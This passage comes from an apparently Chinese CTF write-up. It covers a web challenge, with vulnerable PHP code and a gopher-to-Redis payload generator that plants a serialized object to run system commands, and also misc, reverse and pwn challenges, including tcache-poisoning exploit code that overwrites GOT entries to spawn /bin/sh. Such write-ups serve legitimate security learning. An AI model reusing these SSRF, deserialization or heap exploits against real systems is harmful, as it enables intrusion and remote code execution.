class="keyword">require_once</span> <span class="string">&#x27;session.php&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Record</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;record = [];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;_&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_record</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;record;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">clear_record</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;record = [];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">push</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;record[] = <span class="variable">$url</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">new</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Record</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$session</span> = SM:: <span class="title function_ invoke__">handle_cookie</span>(<span class="string">&#x27;sess_id&#x27;</span>, [<span class="string">&#x27;Record&#x27;</span>, <span class="string">&#x27;new&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;view&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Security-Policy: script-src &#x27;none&#x27;&quot;</span>);</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$session</span>-&gt;<span class="title function_ invoke__">push</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;get_record&#x27;</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application/json&#x27;</span>);</span><br><span class="line">    <span class="variable">$session</span>-&gt;<span class="title function_ invoke__">get_record</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;get_record&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;clear_record&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$session</span>-&gt;<span class="title function_ invoke__">clear_record</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;OK&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Turn off all error reporting</span></span><br><span class="line"><span class="variable">$g</span> = <span class="keyword">new</span> <span class="title class_">Redis</span>();</span><br><span class="line"><span class="variable">$g</span>-&gt;<span class="title function_ invoke__">connect</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">6379</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SM</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$g</span>, <span class="variable">$ss</span>, <span class="variable">$f</span>, <span class="variable">$e</span> = <span class="string">&#x27;serialize&#x27;</span>, <span class="variable">$d</span> = <span class="string">&#x27;unserialize&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;g = <span class="variable">$g</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ss = <span class="variable">$ss</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;e = <span class="variable">$e</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;d = <span class="variable">$d</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;f = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;val = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;__&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;val !== <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;in&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;g-&gt;<span class="title function_ invoke__">exists</span>(<span class="variable">$this</span>-&gt;ss)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hasvalue&quot;</span>;</span><br><span class="line">            <span class="variable">$s</span> = <span class="variable language_">$this</span>-&gt;g-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;ss);</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="variable">$s</span>);</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="variable">$this</span>-&gt;f);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;if1&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$s</span>) &amp;&amp; (<span class="title function_ invoke__">strpos</span>(<span class="variable">$s</span>, <span class="variable">$this</span>-&gt;f[<span class="number">0</span>]) !== <span class="literal">false</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;if2&quot;</span>;</span><br><span class="line">                <span class="title function_ invoke__">var_dump</span>(<span class="variable">$s</span>);</span><br><span class="line">                <span class="title function_ invoke__">var_dump</span>(<span class="variable">$this</span>-&gt;val);</span><br><span class="line">                <span class="title function_ invoke__">var_dump</span>(<span class="variable">$this</span>-&gt;d);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;val = (<span class="variable language_">$this</span>-&gt;d)(<span class="variable">$s</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;if3&quot;</span>;</span><br><span class="line">                <span class="title function_ invoke__">var_dump</span>(<span class="variable">$this</span>-&gt;val);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;val = (<span class="variable language_">$this</span>-&gt;f)();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;val = (<span class="variable language_">$this</span>-&gt;f)();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;des&quot;</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$g</span>;</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$this</span>-&gt;val);</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$this</span>-&gt;e);</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$this</span>-&gt;val);</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable language_">$this</span>-&gt;val !== <span class="literal">null</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="variable">$this</span>-&gt;val);</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="variable">$this</span>-&gt;ss);</span><br><span class="line">            <span class="variable">$g</span>-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$this</span>-&gt;ss, (<span class="variable">$this</span>-&gt;e)(<span class="variable">$this</span>-&gt;val));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>()-&gt;&#123;<span class="variable">$name</span>&#125;(...<span class="variable">$arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">handle_cookie</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$f</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$g</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="variable">$name</span>])) &#123;</span><br><span class="line">            <span class="variable">$ss</span> = <span class="variable">$_COOKIE</span>[<span class="variable">$name</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$ss</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">10</span>));</span><br><span class="line">            <span class="title function_ invoke__">setcookie</span>(<span class="variable">$name</span>, <span class="variable">$ss</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title function_ invoke__">SM</span>(<span class="variable">$g</span>, <span class="variable">$ss</span>, <span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这他妈很明显就是gopher打redis注入恶意的键值，然后反序列化在<img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693234967889-afc41fe3-9d55-469b-aa35-ae777b1523b0.png#averageHue=%23242627&clientId=u61fe652d-b604-4&from=paste&height=42&id=ucfafc2be&originHeight=53&originWidth=578&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=7594&status=done&style=none&taskId=u58dbab90-3176-4d0f-9c2a-4dad0c30cfb&title=&width=462.4" alt="image.png"><br>此处进行rce，我们可以让e为system，val为恶意字符串，这样就执行命令了，但是需要绕过一个正则，就是不可以有字母，我的思路是利用php临时文件，但是就是无法复现，本地8.2都通了，真的是搞心态。。。。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://localhost:8888/&quot;</span></span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line"><span class="comment"># shell=&#x27;O:2:&quot;SM&quot;:2:&#123;s:1:&quot;e&quot;;s:6:&quot;system&quot;;s:3:&quot;val&quot;;s:20:&quot;. /???/???[@-[]?????&quot;;&#125;&#x27;</span></span><br><span class="line">shell=<span class="string">&#x27;O:2:&quot;SM&quot;:4:&#123;s:1:&quot;e&quot;;s:6:&quot;system&quot;;s:3:&quot;val&quot;;s:20:&quot;. /???/????????[@-[]&quot;;s:1:&quot;f&quot;;N;s:8:&quot;boogipop&quot;;s:6:&quot;Record&quot;;&#125;&#x27;</span></span><br><span class="line"><span class="comment"># shell=&#x27;O:2:&quot;SM&quot;:5:&#123;s:1:&quot;e&quot;;s:7:&quot;scandir&quot;;s:3:&quot;val&quot;;s:1:&quot;/&quot;;s:1:&quot;f&quot;;N;s:2:&quot;ss&quot;;s:4:&quot;test&quot;;s:8:&quot;boogipop&quot;;s:6:&quot;Record&quot;;&#125;&#x27;</span></span><br><span class="line"><span class="comment"># shell=&#x27;O:2:&quot;SM&quot;:4:&#123;s:1:&quot;e&quot;;s:7:&quot;phpinfo&quot;;s:3:&quot;val&quot;;i:999999999;s:1:&quot;f&quot;;N;s:8:&quot;boogipop&quot;;s:6:&quot;Record&quot;;&#125;&#x27;</span></span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[<span class="comment">#&quot;auth root&quot;,</span></span><br><span class="line">     <span class="string">&quot;set pop &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">    <span class="comment"># &quot;config set dbfilename pop.php&quot;</span></span><br><span class="line">     <span class="comment"># &quot;get boogipop4&quot;,</span></span><br><span class="line">     <span class="comment"># &quot;set boogipop4 &#123;&#125;&quot;.format(shell),</span></span><br><span class="line">     <span class="comment"># &quot;config set dir &#123;&#125;&quot;.format(path),</span></span><br><span class="line">     <span class="comment"># &quot;config set dbfilename &#123;&#125;&quot;.format(filename),</span></span><br><span class="line">     <span class="string">&quot;save&quot;</span></span><br><span class="line">     ]</span><br><span class="line"><span class="comment">#O:2:&quot;SM&quot;:4:&#123;s:1:&quot;e&quot;;s:6:&quot;system&quot;;s:3:&quot;val&quot;;s:20:&quot;. /???/????????[@-[]&quot;;s:1:&quot;f&quot;;N;s:8:&quot;boogipop&quot;;s:6:&quot;Record&quot;;&#125;</span></span><br><span class="line">payload=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redis_format</span>(<span class="params">arr</span>):</span><br><span class="line">    CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">    cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_payload</span>():</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += quote(quote(redis_format(x)))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(generate_payload())</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><p>前半段flag只需要把文件拖进工具分析<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693124576418-d2bafd74-ebde-4c50-a964-7b4590a1a8bc.png#averageHue=%23fafafa&clientId=uf1cdae73-bf4d-4&from=paste&height=85&id=u4814bf78&originHeight=106&originWidth=558&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=17047&status=done&style=none&taskId=u97d6e3e3-c311-4cc0-9eb0-224942609df&title=&width=446.4" alt="image.png"><br>后半段是用 volatility去找文件<br><code> volatility -f .\blue.raw --profile=Win7SP1x64 filescan|findstr &quot;eskto p&quot;</code><br>有一个readme和key.rsmr以及mouserecorder.exe<br>对readme进行一个明文攻击就可以得到一张图片<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693124681371-1f7e95d7-830f-4e9f-ad5f-23a9ad7fd235.png#averageHue=%23e2e2e2&clientId=uf1cdae73-bf4d-4&from=paste&height=401&id=ua3a5702d&originHeight=501&originWidth=590&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=94770&status=done&style=none&taskId=u9ad683a9-e3b4-4a8e-9ffa-d387bea6c31&title=&width=472" alt="image.png"><br>然后将key导入mousereocreder让其运动，画出了几个圈圈，根据表对照得到key a91e37bf，然后AES解密一下就得到后半段flag<br> flag{194a019a-1767-913a-f140-2626195942a0}  </p>
<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><p>直接在c源码里有个注释。。<img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693124792268-e5187699-6dda-40f1-93e7-54ee6bb3436d.png#averageHue=%231f1f1f&clientId=uf1cdae73-bf4d-4&from=paste&height=214&id=u4929f802&originHeight=267&originWidth=1269&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=22039&status=done&style=none&taskId=u0f107793-b4df-450a-9042-e8c926fff55&title=&width=1015.2" alt="image.png"></p>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><p> tcache poisoning ；UAF<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693124846590-e81cf4f3-d58a-4ab2-a9ab-8cca174e2827.png#averageHue=%23262933&clientId=uf1cdae73-bf4d-4&from=paste&height=114&id=u0fe820e2&originHeight=142&originWidth=798&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=70782&status=done&style=none&taskId=u6a3ce759-504a-422a-9dfb-1bea8dcc226&title=&width=638.4" alt="image.png"><br> 64位开了nx和canary<br> 增删改三个功能<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693124876472-d89cef8c-39f4-452f-84c2-765c8871fe68.png#averageHue=%23fdfdfb&clientId=uf1cdae73-bf4d-4&from=paste&height=386&id=u3472abc9&originHeight=482&originWidth=802&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=95367&status=done&style=none&taskId=u18a51676-a68d-4375-8875-2562a66e909&title=&width=641.6" alt="image.png"><br> v1是index，在if检查中，检查了v1不能超过5（0x404088中存储），以及在list中该 index中没有指针 注意下这个list也是一个堆 malloc一个固定0x1c大小的chunk，在该chunk的前八字节存放name，之后的空间中存 储remark<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693124887694-bc8139b9-b1a7-49fd-8adf-63b2d03f4169.png#averageHue=%23fdfdf9&clientId=uf1cdae73-bf4d-4&from=paste&height=314&id=u92cc4770&originHeight=393&originWidth=799&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=77545&status=done&style=none&taskId=uad81865c-4a01-4a64-829b-0458ee6f79a&title=&width=639.2" alt="image.png"><br> free之后没有清空指针，存在UAF漏洞<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693124900129-79f45b3d-979e-4b22-86cc-8d056f5d756c.png#averageHue=%23fdfdfd&clientId=uf1cdae73-bf4d-4&from=paste&height=376&id=u85eed49d&originHeight=470&originWidth=802&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=83268&status=done&style=none&taskId=u2259879d-506a-43be-a237-0d09c1ee4f0&title=&width=641.6" alt="image.png"><br> 需要注意的是：这里只能修改name，也就是修改chunk的前八字节<br> tcache poisoning<br> tcache poisoning是tcache的攻击手段，作用是可以实现任意地址写，攻击的手法是： 修改位于tcache bin中的chunk的fd，使之指向我们想要修改的地址（注意tcache bin中 chunk的fd是指向下一个chunk的fd，或者说userdata域，而非header，所以不需指向 target-0x10），然后连续申请两次就可以将target申请出来 这道题就可以使用tcache poisoning 我们的第一步应该是修改0x404088里的内容，这里的值限制了我们add chunk的个数不 能超过6，而这显然不够，所以我们把它改大一点：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x0404088</span>-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">4</span>,<span class="string">&#x27;a&#x27;</span>,p64(<span class="number">0x20</span>))</span><br></pre></td></tr></table></figure>
<p> 注意下：delete 0和1之后，在tcache中是1-&gt;0，而我们修改了1的fd，所以0此时就不 再位于tcache中，所以他会被认为是inuse的chunk 然后下一步我们就该leak出libc了，这个程序中没有单独的打印功能，但是再edit功能 中是会打印出该chunk的remark的，也就是chunk第八字节之后的内容。  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>, p64(<span class="number">0x404030</span> - <span class="number">8</span>))</span><br><span class="line">add(<span class="number">7</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please input your choose: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Please input index: &quot;</span>, <span class="built_in">str</span>(<span class="number">8</span>).encode())</span><br><span class="line">setbuf_addr=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="built_in">hex</span>(setbuf_addr))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;setbuf&#x27;</span>,setbuf_addr)</span><br><span class="line">libc_base=setbuf_addr-libc.dump(<span class="string">&#x27;setbuf&#x27;</span>)</span><br><span class="line">system=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;New food name is: &quot;</span>, p64(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693124938468-c2dd44e2-bb83-46e4-8de5-4b0ecfe4a588.png#averageHue=%23e4d6c7&clientId=uf1cdae73-bf4d-4&from=paste&height=79&id=u2cca8ebb&originHeight=99&originWidth=802&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=66680&status=done&style=none&taskId=u6c0b263b-b877-46f0-bd60-10c2675d9d3&title=&width=641.6" alt="image.png"><br> 我们是将chunk申请到了0x404028（userdata），然后edit掉了setresgid函数的got 表，然后泄露出了setbuf的got表 由于这道题没开relro保护，所以我们可以将某个函数的got表修改为system函数，我们 选择free函数，然后free掉一个chunk，并且这个chunk里面写入 &#x2F;bin&#x2F;sh\x00  </p>
